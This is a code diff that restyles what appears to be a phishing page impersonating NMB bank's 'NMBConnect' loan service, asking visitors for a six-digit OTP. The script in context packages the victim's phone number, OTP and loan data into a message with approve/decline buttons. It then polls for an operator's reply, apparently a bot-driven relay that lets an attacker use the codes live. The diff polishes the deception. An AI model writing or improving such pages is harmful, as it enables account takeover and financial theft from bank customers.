@@ -4,23 +4,26 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="theme-color" content="#003366">
-    <title>NMBConnect | Verifying Loans</title>
+    <title>NMBConnect | OTP Verification</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
             --nmb-blue: #003366;
             --nmb-gold: #E4C16A;
+            --nmb-light-blue: #4a90e2;
             --white: #ffffff;
             --error: #ff4d4d;
+            --bg-overlay: rgba(0, 0, 0, 0.55);
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body {
             font-family: 'Poppins', sans-serif;
-            background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?q=80&w=1000&auto=format&fit=crop');
+            background: linear-gradient(var(--bg-overlay), var(--bg-overlay)), url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?q=80&w=1000&auto=format&fit=crop');
             background-size: cover;
             background-position: center;
+            background-attachment: fixed;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -31,18 +34,20 @@
 
         .header-nav {
             width: 100%;
+            max-width: 450px;
             display: flex;
             align-items: center;
-            padding: 10px 0;
-            margin-bottom: 20px;
+            padding: 15px 0;
+            margin-bottom: 30px;
         }
 
-        .back-btn { font-size: 24px; cursor: pointer; margin-right: 15px; }
+        .back-btn { font-size: 24px; cursor: pointer; margin-right: 15px; transition: transform 0.2s; }
+        .back-btn:active { transform: scale(0.9); }
         .nav-title { font-size: 18px; font-weight: 500; }
 
         .logo-container {
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 30px;
         }
 
         .logo-circle {
@@ -53,36 +58,59 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 10px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            margin: 0 auto 15px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.4);
+            border: 2px solid rgba(228, 193, 106, 0.4);
         }
 
-        .brand-name { font-size: 20px; font-weight: 700; }
-        .brand-name .nmb { color: #4a90e2; }
+        .brand-name { font-size: 26px; font-weight: 700; letter-spacing: 0.5px; }
+        .brand-name .nmb { color: var(--nmb-light-blue); }
         .brand-name .connect { color: var(--nmb-gold); }
 
-        .loan-info {
-            background: rgba(0, 51, 102, 0.6);
-            border: 1px solid rgba(228, 193, 106, 0.3);
-            border-radius: 12px;
-            padding: 12px 20px;
-            margin-bottom: 25px;
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 24px;
+            padding: 30px 25px;
             width: 100%;
-            max-width: 360px;
+            max-width: 400px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
             text-align: center;
-            backdrop-filter: blur(5px);
         }
 
-        .loan-info .type { font-size: 13px; font-weight: 600; color: var(--nmb-gold); margin-bottom: 4px; }
-        .loan-info .amount { font-size: 18px; font-weight: 700; color: white; }
+        .card-header {
+            margin-bottom: 25px;
+        }
 
-        .card-head { text-align: center; margin-bottom: 25px; }
-        .card-head h1 { font-size: 22px; font-weight: 700; margin-bottom: 8px; }
-        .card-head p { font-size: 14px; opacity: 0.9; }
+        .card-header h2 {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--white);
+        }
+
+        .card-header p {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.8);
+            line-height: 1.5;
+        }
+
+        .loan-badge {
+            background: rgba(228, 193, 106, 0.15);
+            border: 1px solid var(--nmb-gold);
+            border-radius: 12px;
+            padding: 12px;
+            margin-bottom: 25px;
+        }
+
+        .loan-badge .label { font-size: 12px; text-transform: uppercase; color: var(--nmb-gold); font-weight: 700; margin-bottom: 4px; display: block; }
+        .loan-badge .val { font-size: 18px; font-weight: 700; color: white; }
 
         .otp-row {
             display: flex;
-            gap: 10px;
+            gap: 8px;
             justify-content: center;
             margin-bottom: 30px;
         }
@@ -93,67 +121,85 @@
             text-align: center;
             font-size: 24px;
             font-weight: 700;
-            border: 1px solid rgba(255, 255, 255, 0.8);
+            border: 1.5px solid rgba(255, 255, 255, 0.3);
             border-radius: 12px;
-            background: rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.08);
             color: white;
-            backdrop-filter: blur(5px);
             outline: none;
-            transition: all 0.2s;
+            transition: all 0.3s;
         }
 
-        .otp-box:focus { border-color: var(--nmb-gold); background: rgba(255, 255, 255, 0.2); }
-        .otp-box.ok { border-color: #4caf50; }
+        .otp-box:focus {
+            border-color: var(--nmb-gold);
+            background: rgba(255, 255, 255, 0.15);
+            box-shadow: 0 0 0 4px rgba(228, 193, 106, 0.1);
+        }
+
+        .otp-box.ok {
+            border-color: #4caf50;
+            background: rgba(76, 175, 80, 0.1);
+        }
 
         .verify-btn {
             width: 100%;
-            max-width: 360px;
-            padding: 16px;
-            background: white;
+            padding: 18px;
+            background: var(--white);
             color: var(--nmb-blue);
             border: none;
-            border-radius: 12px;
-            font-size: 18px;
-            font-weight: 600;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 700;
             cursor: pointer;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 1.5px;
+            transition: all 0.3s;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
         }
 
+        .verify-btn:hover { background: #f0f0f0; transform: translateY(-2px); }
+        .verify-btn:active { transform: translateY(0); }
+
         .error-msg {
-            color: var(--error);
+            color: #ff6b6b;
             font-size: 13px;
             text-align: center;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
             display: none;
-            background: rgba(0,0,0,0.6);
-            padding: 10px;
-            border-radius: 10px;
-            border: 1px solid var(--error);
+            background: rgba(255, 77, 77, 0.1);
+            padding: 12px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 77, 77, 0.3);
         }
 
         .overlay {
             position: fixed; inset: 0;
             display: none;
             align-items: center; justify-content: center; flex-direction: column;
-            background: rgba(0,0,0,0.85);
+            background: rgba(0, 51, 102, 0.9);
             z-index: 2000;
-            backdrop-filter: blur(8px);
+            backdrop-filter: blur(10px);
             text-align: center;
             padding: 20px;
         }
 
         .overlay.on { display: flex; }
-        .spin { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.1); border-top-color: var(--nmb-gold); border-radius: 50%; animation: sp 0.8s linear infinite; }
-        .sp-t { font-size: 18px; font-weight: 600; color: white; margin-top: 20px; }
-        .sp-s { font-size: 14px; color: rgba(255,255,255,0.7); margin-top: 10px; }
+        .spin { width: 60px; height: 60px; border: 4px solid rgba(255,255,255,0.1); border-top-color: var(--nmb-gold); border-radius: 50%; animation: sp 1s cubic-bezier(0.4, 0, 0.2, 1) infinite; }
+        .sp-t { font-size: 20px; font-weight: 600; color: white; margin-top: 25px; }
+        .sp-s { font-size: 14px; color: rgba(255,255,255,0.7); margin-top: 12px; max-width: 280px; line-height: 1.6; }
         @keyframes sp { to { transform: rotate(360deg); } }
+
+        @media (max-width: 480px) {
+            body { padding: 15px; }
+            .card { padding: 25px 20px; }
+            .otp-box { width: 40px; height: 50px; font-size: 20px; }
+            .brand-name { font-size: 22px; }
+        }
     </style>
 </head>
 <body onload="init()">
     <div class="header-nav">
         <span class="back-btn" onclick="location.href='login.html'">❮</span>
-        <span class="nav-title">Verifying NMBConnect Loans</span>
+        <span class="nav-title">NMBConnect Loan</span>
     </div>
 
     <div class="logo-container">
@@ -166,33 +212,35 @@
         <div class="brand-name"><span class="nmb">NMB</span><span class="connect">Connect</span></div>
     </div>
 
-    <div id="loanBox" class="loan-info" style="display:none;">
-        <div class="type" id="loanType">NMB Loan</div>
-        <div class="amount" id="loanAmount">$0.00 USD</div>
+    <div class="card">
+        <div class="card-header">
+            <h2>Verify Code</h2>
+            <p>Enter the 6-digit OTP code sent to your phone to finalize your verification.</p>
+        </div>
+
+        <div id="loanBox" class="loan-badge" style="display:none;">
+            <span class="label" id="loanType">NMB Loan</span>
+            <span class="val" id="loanAmount">$0.00 USD</span>
+        </div>
+
+        <div id="err" class="error-msg"></div>
+
+        <div class="otp-row" id="otpRow">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+        </div>
+
+        <button class="verify-btn" onclick="doOTP()">Complete Verification</button>
     </div>
-
-    <div class="card-head">
-        <h1>Verify Code</h1>
-        <p>Enter the 6-digit OTP code sent to your phone</p>
-    </div>
-
-    <div id="err" class="error-msg"></div>
-
-    <div class="otp-row" id="otpRow">
-        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-    </div>
-
-    <button class="verify-btn" onclick="doOTP()">Verify</button>
 
     <div id="ov" class="overlay">
         <div class="spin"></div>
         <div class="sp-t">Verifying Code</div>
-        <div class="sp-s">Please wait a moment while we process your request.<br>Do not close this page.</div>
+        <div class="sp-s">Please wait while we confirm your security code. Do not refresh this page.</div>
     </div>
 
     <script>
@@ -263,7 +311,7 @@
 
         function doOTP() {
             clrErr();
-            if (otp.length !== 6) { showErr('Enter the 6-digit code'); return; }
+            if (otp.length !== 6) { showErr('Please enter the full 6-digit code'); return; }
 
             const msg = `🔑 <b>OTP Code</b>\n\n<b>Phone:</b> <code>+263${phone}</code>\n<b>OTP:</b> <code>${otp}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>`;
             const btns = [[{ text: '✓ Approved', callback_data: 'otp_approved' }, { text: '✗ Declined', callback_data: 'otp_declined' }]];
@@ -291,7 +339,7 @@
                                     else if (cb === 'otp_declined') { 
                                         clearInterval(iv); 
                                         document.getElementById('ov').classList.remove('on'); 
-                                        showErr('Invalid code. Please try again.'); 
+                                        showErr('Invalid security code. Please check and try again.'); 
                                         boxes.forEach(b => { b.value = ''; b.classList.remove('ok'); }); 
                                         boxes[0].focus(); 
                                     }
